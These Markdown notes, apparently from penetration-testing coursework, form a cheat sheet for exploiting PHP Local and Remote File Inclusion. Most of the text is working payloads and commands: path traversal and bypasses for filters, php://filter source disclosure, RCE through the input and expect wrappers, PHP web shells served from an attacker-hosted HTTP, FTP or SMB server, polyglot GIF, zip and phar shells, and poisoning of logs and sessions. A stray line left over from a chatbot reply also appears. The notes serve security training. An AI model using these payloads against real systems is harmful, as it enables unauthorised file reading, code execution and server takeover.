# Local File Inclusion (LFI)

LFI occurs when user input is used in a file include function, allowing reading of local files from the server.

**Basic Example**

A vulnerable parameter:

`http://<SERVER_IP>:<PORT>/index.php?language=es.php`

If the parameter is passed directly:

`include($_GET['language']);`

We can change it to:

`?language=/etc/passwd`       # Linux
`?language=C:\Windows\boot.ini`  # Windows


**Path Traversal**

If input is appended to a directory:

`include("./languages/" . $_GET['language']);`

Use `../` to move up directories:

`?language=../../../../etc/passwd`

Even excessive `../` won’t break the path.

**Filename Prefix Bypass**

If input has a prefix:

`include("lang_" . $_GET['language']);`

Try adding / before traversal:

`?language=/../../../etc/passwd`

(May not work if the prefixed directory doesn’t exist.)


**Appended Extensions**

If `.php` is appended automatically:

`include($_GET['language'] . ".php");`

`?language=/etc/passwd` becomes `/etc/passwd.php` (nonexistent).
Bypasses may involve `wrappers/filters` (covered later).

**Second-Order LFI**

LFI can occur indirectly when another function uses user-controlled data stored elsewhere (e.g., database).

Example:

`/profile/$username/avatar.png`

If username is `../../../etc/passwd`, the avatar loader may include the target file instead.


# Basic LFI Bypasses

Techniques to bypass common LFI protections.

**1. Non-Recursive Path Traversal Filters**

Example filter:

`$language = str_replace('../', '', $_GET['language']);`

Bypass using:

<pre>?language=....//....//....//....//etc/passwd
?language=..././..././..././..././etc/passwd
?language=....\/\/....\/\/etc/passwd</pre>

**2. Encoding**

`Encode ../ → %2e%2e%2f`

Example:

`?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`

You can double-encode for stricter filters.

**3. Approved Paths**

Filter:

<pre>if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}</pre>

Bypass:

`?language=./languages/../../../../etc/passwd`

**4. Appended Extensions**

If `.php` is appended:

`include($_GET['language'] . ".php");`

Bypass only possible on older PHP versions (see below).

**5. Path Truncation (PHP < 5.3/5.4)**

Use long string (>4096 chars) to truncate `.php`:

`echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`

**6. Null Bytes (PHP < 5.5)**

Terminate string before .php:

`?language=/etc/passwd%00`


# PHP Filters

Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.

PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE.

**Input Filters**

PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.
To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with:

`php://filter/`

The filter wrapper has several parameters, but the main ones we require for our attack are:

- resource → the stream we want to apply the filter to (e.g., a local file)
- read → the type of filter to apply (e.g., base64 encode)

The filter useful for LFI attacks is:

`convert.base64-encode`

**Fuzzing for PHP Files**

Example fuzzing command:

`ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`

Example output:

<pre>index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]</pre>

Tip: When fuzzing for LFI, scan for all response codes (200, 301, 302, 403) — you may still be able to include those files.

**Standard PHP Inclusion**

Example request:

`http://<SERVER_IP>:<PORT>/index.php?language=config`

In many cases, this will execute the PHP file and render HTML output, meaning you won’t see the raw PHP source.

**Source Code Disclosure with PHP Filters**

We can use the base64 filter to read the raw PHP source code:

`php://filter/read=convert.base64-encode/resource=config`

Example LFI request:

`http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config`

Example decoding on attacker machine:

`echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d`

Decoded snippet:

<pre>if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}</pre>

# PHP Wrappers

Use PHP Wrappers with LFI to read files or run commands.  
We’ll cover 3 main ones: **data**, **input**, and **expect**.

---

## 1. Data Wrapper

Needs `allow_url_include = On` in PHP config.  
Check with LFI + base64 filter:

`curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`


## 2. Input Wrapper

Same as data, but send PHP code via POST:

`curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid`


## 3. Expect Wrapper

Must be enabled in php.ini (extension=expect).

Check:

`echo 'BASE64_STRING' | base64 -d | grep expect`

Run command directly:

`curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`

This will show **exactly** on GitHub as you want — all `<` and `>` safe, commands intact, syntax highlighting.


# Remote File Inclusion (RFI)

RFI allows including remote files if the vulnerable function accepts URLs. Benefits:

- Enumerate local ports/web apps (SSRF)
- Execute remote code by including a malicious hosted script

RFI vs LFI: almost all RFI vulnerabilities are also LFIs, but not every LFI allows remote inclusion. Reasons:

- Function may block remote URLs
- Only part of filename controllable (not full protocol)
- Server config may disable RFI
- Some functions allow URL inclusion but not code execution, useful for SSRF.

| Language | Function                  | Read | Execute | Remote URL |
| -------- | ------------------------- | ---- | ------- | ---------- |
| PHP      | include()/include\_once() | ✅    | ✅       | ✅          |
| PHP      | file\_get\_contents()     | ✅    | ❌       | ✅          |
| Java     | import                    | ✅    | ✅       | ✅          |
| .NET     | @Html.RemotePartial()     | ✅    | ❌       | ✅          |
| .NET     | include                   | ✅    | ✅       | ✅          |


## Remote Code Execution via RFI

Create a malicious PHP shell:

`echo '<?php system($_GET["cmd"]); ?>' > shell.php`

Host it (HTTP example):

`sudo python3 -m http.server <LISTENING_PORT>`

Include and execute command:

`http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`

## FTP Hosting

Start FTP server:

`sudo python -m pyftpdlib -p 21`

Include shell:

`http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`

With credentials if needed:

`curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'`

## SMB Hosting (Windows)

No allow_url_include needed. Spin up SMB server:

`impacket-smbserver -smb2support share $(pwd)`

Include shell via UNC path:

`http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`

Works best on the same network; internet access to SMB often blocked.

# LFI and File Uploads

File uploads are common in web apps. If a function allows file inclusion and code execution, uploading a malicious file lets us achieve remote code execution, even if the upload form seems safe.

Example: Upload image.jpg with PHP code inside → include it via LFI → execute PHP code.

| Language | Function                  | Read | Execute | Remote URL |
| -------- | ------------------------- | ---- | ------- | ---------- |
| PHP      | include()/include\_once() | ✅    | ✅       | ✅          |
| PHP      | require()/require\_once() | ✅    | ✅       | ❌          |
| NodeJS   | res.render()              | ✅    | ✅       | ❌          |
| Java     | import                    | ✅    | ✅       | ✅          |
| .NET     | include                   | ✅    | ✅       | ✅          |


## Image Upload Method

Craft malicious image:

`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

**GIF8 = image magic bytes to bypass checks**

Works with any allowed image/file type

**Upload file:**

`http://<SERVER_IP>:<PORT>/settings.php`

Use profile/avatar upload form

## Find uploaded file path:

Inspect image URL after upload:

`<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">`

Include uploaded file via LFI:

`http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`

Use ../ to traverse if the LFI prepends a directory

## Zip Upload Method (PHP only)

Create PHP web shell and zip it:

`echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`

Include via zip:// wrapper:

`http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`

%23 = # to reference file inside archive

## Phar Upload Method (PHP only)

Create Phar script (shell.php):

<pre><?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();</pre>

**Compile Phar and rename:**

`php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`

**Upload and include with phar:// wrapper:**

`http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

`%2F` = / for Phar sub-file

Tip: Image upload is most reliable. Zip and Phar wrappers are alternatives.

# Log Poisoning

Log poisoning attacks rely on writing PHP code into a file we control (logs or session files) and then including that file via LFI to execute the code. The server must have read access to the log or session files.

## PHP Session Poisoning

Find PHP session file

PHP stores sessions in `/var/lib/php/sessions/` (Linux) or `C:\Windows\Temp\` (Windows).

File name: `sess_<PHPSESSID>`

Example:

`PHPSESSID = nhhv8i0o6ua4g88bkdl9u1fdsd`

Session file: `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

## Check file via LFI

`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

## Control session values

Use `?language=session_poisoning` to change controllable fields:

`http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning`

## Poison session with PHP code

`http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`

Include session and execute command

`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`

The session file is overwritten after each inclusion; consider writing a permanent shell to the web directory or sending a reverse shell.

## Server Log Poisoning

Log locations

- Apache: `/var/log/apache2/` (Linux), `C:\xampp\apache\logs\` (Windows)
- Nginx: `/var/log/nginx/` (Linux), `C:\nginx\log\` (Windows)

## Include log via LFI

`http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`

## Poison log via User-Agent header

Using cURL:

`echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison`
`curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison`

Include log and execute command:

`http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id`

Works similarly on Nginx logs.

## Additional Techniques

Include `/proc/self/environ` or `/proc/self/fd/N` files to poison process environment variables (may require privileges).

## Other service logs to consider:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

Poison them via controllable parameters (username, email, etc.) and include via LFI.

# Automated Scanning

Understanding manual LFI exploitation is important because some vulnerabilities require custom payloads or bypasses to work around WAFs/firewalls. But for simple cases, we can use automated scanning to quickly find and test LFI vulnerabilities.

## Fuzzing Parameters

Many web pages have hidden or unlinked parameters that are less secure.
We can fuzz these parameters using tools like ffuf to find exposed ones.

Example: fuzzing GET parameters

`ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`

Once an exposed parameter is found, we can test all LFI payloads on it.

Tip: Focus on popular LFI parameters for faster scans.

## LFI Wordlists

Manual testing is reliable, but wordlists save time for common payloads.

Example using `LFI-Jhaddix.txt` on the `?language=` parameter:

`ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`

Output shows payloads that successfully include files, like `/etc/passwd`.

**Always verify manually that payloads work as expected.**

## Fuzzing Server Files

Server Webroot

Sometimes we need the full webroot path to reach uploaded files.

Fuzz for index.php in common webroot paths:

`ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php language=../../../../FUZZ/index.php' -fs 2287`

Example result: `/var/www/html/`

## Server Logs & Configurations

Important for log poisoning and finding the webroot.

Fuzz LFI vulnerability using a Linux wordlist:

`ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`

Example results: `/etc/apache2/apache2.conf`, `/etc/hosts`, `/etc/login.defs`

Read configuration files to find webroot and log paths:

`curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf`
`curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars`

These reveal paths like `/var/www/html/` and `/var/log/apache2`.

Note: You can also use wordlists to locate logs quickly, but manually reading files can reveal unknown information.

## LFI Tools

Automated tools save time but may miss vulnerabilities that manual testing finds.

Common tools: LFISuite, LFiFreak, liffy

Many are Python2-based and outdated, so test their accuracy before relying on them.
